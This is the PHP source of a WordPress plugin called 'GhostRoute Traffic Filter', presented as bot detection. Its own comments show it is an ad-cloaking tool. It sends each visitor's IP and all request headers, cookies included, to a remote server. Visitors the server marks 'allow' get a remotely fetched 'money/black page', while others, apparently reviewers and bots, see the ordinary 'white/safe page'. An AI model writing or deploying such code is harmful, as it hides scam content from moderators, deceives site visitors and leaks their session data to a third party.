<?php
/**
 * Plugin Name: GhostRoute Traffic Filter
 * Plugin URI: https://github.com/lucifer7838/ghostroute
 * Description: Integrates WordPress with GhostRoute for intelligent traffic filtering and bot detection.
 * Version: 1.0.0
 * Author: GhostRoute
 * Author URI: https://github.com/lucifer7838/ghostroute
 * License: GPL-2.0-or-later
 * Text Domain: ghostroute
 */

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Main GhostRoute plugin class.
 */
class GhostRoute_Plugin {

    /** @var string Option group name */
    private $option_group = 'ghostroute_settings';

    /** @var string Option name in wp_options */
    private $option_name = 'ghostroute_options';

    /** @var string Settings page slug */
    private $page_slug = 'ghostroute-settings';

    /**
     * Initialize the plugin.
     */
    public function __construct() {
        add_action('template_redirect', array($this, 'evaluate_visitor'));
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('admin_init', array($this, 'register_settings'));
    }

    /**
     * Get plugin options with defaults.
     *
     * @return array
     */
    private function get_options() {
        $defaults = array(
            'api_url'     => '',
            'campaign_id' => '',
            'api_key'     => '',
            'enabled'     => '1',
        );
        $options = get_option($this->option_name, array());
        return wp_parse_args($options, $defaults);
    }

    /**
     * Evaluate the current visitor via GhostRoute API.
     */
    public function evaluate_visitor() {
        if (is_admin()) {
            return;
        }

        $options = $this->get_options();

        if (empty($options['enabled']) || $options['enabled'] !== '1') {
            return;
        }

        if (empty($options['api_url']) || empty($options['campaign_id'])) {
            return;
        }

        $visitor_ip = $this->get_visitor_ip();
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? sanitize_text_field($_SERVER['HTTP_USER_AGENT']) : '';

        $headers = array();
        foreach ($_SERVER as $key => $value) {
            if (strpos($key, 'HTTP_') === 0) {
                $header_name = str_replace('_', '-', substr($key, 5));
                $headers[strtolower($header_name)] = sanitize_text_field($value);
            }
        }

        $request_body = array(
            'ip'          => $visitor_ip,
            'user_agent'  => $user_agent,
            'headers'     => $headers,
            'campaign_id' => sanitize_text_field($options['campaign_id']),
        );

        $api_url = trailingslashit(esc_url_raw($options['api_url'])) . 'evaluate';
        $api_url = rtrim($api_url, '/');
        // Rebuild URL properly
        $api_url = rtrim(esc_url_raw($options['api_url']), '/') . '/evaluate';

        $request_args = array(
            'body'    => wp_json_encode($request_body),
            'headers' => array(
                'Content-Type' => 'application/json',
            ),
            'timeout' => 5,
            'method'  => 'POST',
        );

        if (!empty($options['api_key'])) {
            $request_args['headers']['X-API-Key'] = sanitize_text_field($options['api_key']);
        }

        $response = wp_remote_post($api_url, $request_args);

        if (is_wp_error($response)) {
            // On error, allow the visitor through (fail open)
            return;
        }

        $status_code = wp_remote_retrieve_response_code($response);
        if ($status_code !== 200) {
            return;
        }

        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);

        if (!is_array($data) || !isset($data['decision'])) {
            return;
        }

        // If decision is 'allow', show the money/black page
        if ($data['decision'] === 'allow') {
            $this->render_money_page($options);
        }
        // If decision is 'block', do nothing - show normal WP page (white/safe page)
    }

    /**
     * Render the money/black page content and exit.
     *
     * @param array $options Plugin options.
     */
    private function render_money_page($options) {
        $campaign_id = sanitize_text_field($options['campaign_id']);
        $api_url = rtrim(esc_url_raw($options['api_url']), '/');

        // Fetch the black page content from the campaign's configured URL
        $black_page_url = $api_url . '/campaign/' . $campaign_id . '/black';
        $page_response = wp_remote_get($black_page_url, array('timeout' => 10));

        if (!is_wp_error($page_response) && wp_remote_retrieve_response_code($page_response) === 200) {
            $content = wp_remote_retrieve_body($page_response);
            // Sanitize remote HTML - allow safe HTML tags via wp_kses_post
            echo wp_kses_post($content);
            exit;
        }
    }

    /**
     * Get the real visitor IP address.
     *
     * @return string
     */
    private function get_visitor_ip() {
        $ip_headers = array(
            'HTTP_CF_CONNECTING_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'REMOTE_ADDR',
        );

        foreach ($ip_headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = sanitize_text_field($_SERVER[$header]);
                // Handle comma-separated list (X-Forwarded-For)
                if (strpos($ip, ',') !== false) {
                    $ips = explode(',', $ip);
                    $ip = trim($ips[0]);
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }

        return '0.0.0.0';
    }

    /**
     * Add admin menu page.
     */
    public function add_admin_menu() {
        add_options_page(
            'GhostRoute Settings',
            'GhostRoute',
            'manage_options',
            $this->page_slug,
            array($this, 'render_settings_page')
        );
    }

    /**
     * Register settings with WordPress Settings API.
     */
    public function register_settings() {
        register_setting(
            $this->option_group,
            $this->option_name,
            array($this, 'sanitize_options')
        );

        add_settings_section(
            'ghostroute_main_section',
            'API Configuration',
            array($this, 'section_description'),
            $this->page_slug
        );

        add_settings_field(
            'ghostroute_enabled',
            'Enable GhostRoute',
            array($this, 'render_enabled_field'),
            $this->page_slug,
            'ghostroute_main_section'
        );

        add_settings_field(
            'ghostroute_api_url',
            'API URL',
            array($this, 'render_api_url_field'),
            $this->page_slug,
            'ghostroute_main_section'
        );

        add_settings_field(
            'ghostroute_campaign_id',
            'Campaign ID',
            array($this, 'render_campaign_id_field'),
            $this->page_slug,
            'ghostroute_main_section'
        );

        add_settings_field(
            'ghostroute_api_key',
            'API Key',
            array($this, 'render_api_key_field'),
            $this->page_slug,
            'ghostroute_main_section'
        );
    }

    /**
     * Sanitize and validate plugin options.
     *
     * @param array $input Raw input.
     * @return array Sanitized output.
     */
    public function sanitize_options($input) {
        $sanitized = array();
        $sanitized['enabled'] = isset($input['enabled']) ? '1' : '0';
        $sanitized['api_url'] = isset($input['api_url']) ? esc_url_raw(trim($input['api_url'])) : '';
        $sanitized['campaign_id'] = isset($input['campaign_id']) ? sanitize_text_field(trim($input['campaign_id'])) : '';
        $sanitized['api_key'] = isset($input['api_key']) ? sanitize_text_field(trim($input['api_key'])) : '';

        if (empty($sanitized['api_url'])) {
            add_settings_error($this->option_name, 'api_url', 'API URL is required.');
        }

        if (empty($sanitized['campaign_id'])) {
            add_settings_error($this->option_name, 'campaign_id', 'Campaign ID is required.');
        }

        return $sanitized;
    }

    /**
     * Render the settings section description.
     */
    public function section_description() {
        echo '<p>Configure your GhostRoute API connection settings below.</p>';
    }

    /**
     * Render the enabled checkbox field.
     */
    public function render_enabled_field() {
        $options = $this->get_options();
        $checked = checked($options['enabled'], '1', false);
        echo '<input type="checkbox" name="' . esc_attr($this->option_name) . '[enabled]" value="1" ' . $checked . ' />';
        echo '<p class="description">Enable or disable traffic filtering.</p>';
    }

    /**
     * Render the API URL field.
     */
    public function render_api_url_field() {
        $options = $this->get_options();
        echo '<input type="url" name="' . esc_attr($this->option_name) . '[api_url]" value="' . esc_attr($options['api_url']) . '" class="regular-text" placeholder="https://your-ghostroute-server.com" />';
        echo '<p class="description">The base URL of your GhostRoute API server.</p>';
    }

    /**
     * Render the Campaign ID field.
     */
    public function render_campaign_id_field() {
        $options = $this->get_options();
        echo '<input type="text" name="' . esc_attr($this->option_name) . '[campaign_id]" value="' . esc_attr($options['campaign_id']) . '" class="regular-text" placeholder="your-campaign-uuid" />';
        echo '<p class="description">The UUID of the campaign to evaluate against.</p>';
    }

    /**
     * Render the API Key field.
     */
    public function render_api_key_field() {
        $options = $this->get_options();
        echo '<input type="text" name="' . esc_attr($this->option_name) . '[api_key]" value="' . esc_attr($options['api_key']) . '" class="regular-text" placeholder="gr_..." />';
        echo '<p class="description">Your GhostRoute API key (optional, required if authentication is enabled).</p>';
    }

    /**
     * Render the admin settings page.
     */
    public function render_settings_page() {
        if (!current_user_can('manage_options')) {
            return;
        }
        ?>
        <div class="wrap">
            <h1><?php echo esc_html(get_admin_page_title()); ?></h1>
            <form method="post" action="options.php">
                <?php
                settings_fields($this->option_group);
                do_settings_sections($this->page_slug);
                submit_button();
                ?>
            </form>
        </div>
        <?php
    }
}

// Initialize the plugin
new GhostRoute_Plugin();
